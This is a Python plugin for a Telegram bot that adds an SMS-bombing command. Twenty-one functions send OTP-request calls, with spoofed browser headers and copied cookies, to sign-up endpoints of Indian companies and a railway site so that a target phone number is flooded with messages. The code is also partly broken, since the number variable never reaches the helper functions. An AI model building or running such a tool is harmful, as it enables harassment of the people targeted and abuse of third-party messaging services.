from pyrogram import Client, filters
from pyrogram.types import Message
import requests
from BABYMUSIC import app

# Protected list (can also use a database like MongoDB for persistence)
protected_numbers = set()

# number = ""

def sms_1():

      url = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
      
      data = {
    "mobile": number,
    "deviceId": "d6be3862-7659-46c0-98b9-3d13328a243c",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": "false"
}

      headers = {
    "Content-Type": "application/json"
}

      response = requests.post(url, json=data, headers=headers)

# Flipkart api

def sms_2():

      url = "https://www.flipkart.com/api/5/user/otp/generate"
      
      headers = {
    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
    "Origin": "https://www.flipkart.com",
    "Content-Type": "application/x-www-form-urlencoded"
}
      
      data = {
    "loginId": "+91" + number
}

      response = requests.post(url, headers=headers, data=data)

# Confirmtkt api

def sms_3():

      url = "https://securedapi.confirmtkt.com/api/platform/register"

      data = {
    "newOtp": "true",
    "mobileNumber": number
}

      response = requests.get(url, params=data)

# Housing api

def sms_4():

      url = "https://login.housing.com/api/v2/send-otp"

      data = {
    "phone": number
}

      headers = {
    "Content-Type": "application/json",
}

      response = requests.post(url, json=data, headers=headers)

# Byjusc api

def sms_5():
       
      url = "https://identity.tllms.com/api/request_otp"
      
      data = {
    "phone": "+91-"+number,
    "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
}

      response = requests.post(url, json=data)

# Moglix api

def sms_6():
       
       url = "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2"
       
       data = {"email":"","phone": number ,"type":"p","source":"signup","buildVersion":"25.29","device":"mobile"}
       
       response = requests.post(url,json=data)

# Aakash api

def sms_7():

      url = "https://iacst.aakash.ac.in/anthe/global-otp-verify"
      
      payload = {
    'mobileparam': number,
    'global_data_id': 'anthe-otp',
    'student_name': '',
    'corpid': 'undefined'
}

      response = requests.post(url, data=payload)

# Irsmsa api

def sms_8():
       
       url = "https://railmadad.indianrailways.gov.in/madad/FetchData?mobile="+number+"&email=&fetchdatatype=userotp"
       
       response = requests.get(url)


# Unacademy api

def sms_9():
       
       url = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
       
       data = {"phone": number ,"country_code":"IN","otp_type":1,"email":"","send_otp":True,"is_un_teach_user":False}
       
       response = requests.post(url,json=data)

# Rapido api

def sms_10():
       
       url = "https://customer.rapido.bike/api/otp"
       
       data = {"mobile": number}      
       
       response = requests.post(url,json=data)

# Pwalla api

def sms_11():
       
       url = "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189"
       
       data = {
  "mobile": number,
  "countryCode": "+91",
  "firstName": "Jarvis",
  "lastName": "" }
  
       response = requests.post(url,json=data)

# Entri api

def sms_12():

      url = "https://entri.app/api/v3/users/check-phone/"

      headers = {
    "Host": "entri.app",
    "Content-Length": "25",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Client": "web",
    "User-Language": "hi",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://webapp.entri.app",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://webapp.entri.app/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": (
        "_gcl_au=1.1.892674944.1705134652; "
        "_fbp=fb.1.1705134652145.1810880738; "
        "_gid=GA1.2.2122718671.1705134654; "
        "_clck=3nmn7j%7C2%7Cfid%7C0%7C1473; "
        "_hjFirstSeen=1; "
        "_hjIncludedInSessionSample_2883549=0; "
        "_hjSession_2883549=eyJpZCI6ImVjMzVhYjk4LTRhNzItNDllNi05YmQ0LWIyYzBjOWI4YjNhMSIsImMiOjE3MDUxMzQ2NTUxMjQsInMiOjAsInIiOjAsInNiIjowfQ==; "
        "_hjAbsoluteSessionInProgress=0; "
        "_ga=GA1.1.1357392589.1705134653; "
        "_ga_0ZC25J7WK3=GS1.1.1705134652.1.1.1705134666.0.0.0; "
        "_hjSessionUser_2883549=eyJpZCI6ImI2ZTBmYjQzLWY2MGMtNWNkYi04ZDZkLTc4MTQyN2Q9; "
        "_ga_2ZHJ5NB915=GS1.1.1705134668.1.0.1705134668.0.0.0; "
        "_clsk=lik7pq%7C1705134668098%7C2%7C1%7Ce.clarity.ms%2Fcollect; "
        "mp_5830f8797eddcab822bff041d7ecd1d7_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18d01f23d9b1b46-0b0939f8477842-b457550-46500-18d01f23d9b1b46%22%2C%22%24device_id%22%3A%20%2218d01f23d9b1b46%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fentri.app%2F%22%2C%22%24initial_referring_domain%22%3A%20%22entri.app%22%7D; "
        "moe_uuid=a8590dd4-7534-4b9f-b521-6b92158414ab; "
        "_fw_crm_v=bfb96756-86e2-4557-a9ff-cf5171fee4b0"
    ),
}

      data = {"phone":"+91"+number}

      response = requests.post(url, headers=headers, json=data)

# Postpe api

def sms_13():
       
      url = "https://api-consumer.bharatpe.in/generic/customer/otp/generate"
      headers = {
    'Host': 'api-consumer.bharatpe.in',
    'content-length': '91',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'clientid': 'postpe',
    'content-type': 'application/json; charset=UTF-8',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'accept': '*/*',
    'origin': 'https://postpe.app',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://postpe.app/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
}

      data = {"hashKey": "", "mobile": number, "serviceName": "POSTPE_LEAD_GENERATION", "type": "MOBILE"}
      response = requests.post(url, headers=headers, json=data)

# Adaotp api

def sms_14():       

      url = "https://www.adda52.org.in/api/v1/offers/user/sendOtp"
      
      data = {
    'user': number,
    'clientName': 'web',
    'domainKey': 'Adda52.org.in',
    'source': 'landing_page'
}

      response = requests.post(url, data=data)

# Lsmeat api

def sms_15():
       
       url = "https://www.licious.in/api/login/signup"
       
       data = {"phone": number,"captcha_token": None}
       
       response = requests.post(url,json=data)

# Ekacare api

def sms_16():
       
       url = "https://cowin.eka.care/v2/generate_otp"
       
       data = {"mobile_no":"+91"+number,"allow_whatsapp":False,"auto_retry":False}
       
       response = requests.post(url,json=data)

# desifarm api

def sms_17():
       
       url = "https://newnode.desifarmsindia.in/desi_farm/web_api/sendOTPWeb"
       
       data = {"Customer_Mobile_Number": number}
       
       response = requests.post(url,json=data)

# Indmart api

def sms_18():
       
       url = "https://m.indiamart.com/ajaxrequest/identified/common/otpVerification"
       
       data = {
  "user": number,
  "screenName": "IMOB MESSAGES",
  "type": "OTPGEN",
  "authCode": "",
  "glusr_id": "209934899",
  "ciso": "IN",
  "email": "",
  "user_mobile_country_code": "91",
  "user_country": "India",
  "userIp": "157.35.48.125",
  "OTPResend": 0,
  "emailVerify": "",
  "source": "",
  "msg_key": 1,
  "attribute_id": "",
  "verifyUser": False,
  "glid": "209934899"
}
       response = requests.post(url,json=data)

# Binsar api

def sms_19():
       
       url = "https://binsar.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Whytef api

def sms_20():
       
       url = "https://whytefarms.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Mlkpot api 

def sms_21():
       
       url = "https://milkpot.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)


# Add a number to the protected list
@app.on_message(filters.command("protectnum") & filters.private)
async def add_protected(client: Client, message: Message):
    try:
        # Extract the number
        command, number = message.text.split(maxsplit=1)
        if number.isdigit():
            protected_numbers.add(number)
            await message.reply_text(f"✅ Number `{number}` added to the protected list.")
        else:
            await message.reply_text("❌ Invalid number format. Please enter a valid number.")
    except ValueError:
        await message.reply_text("❌ Usage: `/protectnum <number>`")

# SMS Bombing Command
@app.on_message(filters.command("bombb") & filters.private)
async def sms_bomb(client: Client, message: Message):
    try:
        # Extract the number
        command, number = message.text.split(maxsplit=1)
        if number.isdigit():
            if number in protected_numbers:
                await message.reply_text(f"❌ Number `{number}` is protected and cannot be bombed.")
                return
            # Start SMS bombing (replace this with your SMS bombing function)
            await message.reply_text(f"🚀 Starting SMS bombing on `{number}`...")
            # Call your bombing function here (e.g., `start_bombing(number)`)
            sms_1()
            sms_2()
            sms_3()
            sms_4()
            sms_5()
            sms_6()
            sms_7()
            sms_9()
            sms_10()
            sms_11()
            sms_12()
            sms_13()
            sms_14()
            sms_15()
            sms_16()
            sms_17()
            sms_18()
            await message.reply_text(f"🎯 SMS bombing on `{number}` completed.")
        else:
            await message.reply_text("❌ Invalid number format. Please enter a valid number.")
    except ValueError:
        await message.reply_text("❌ Usage: `/bomb <number>`")
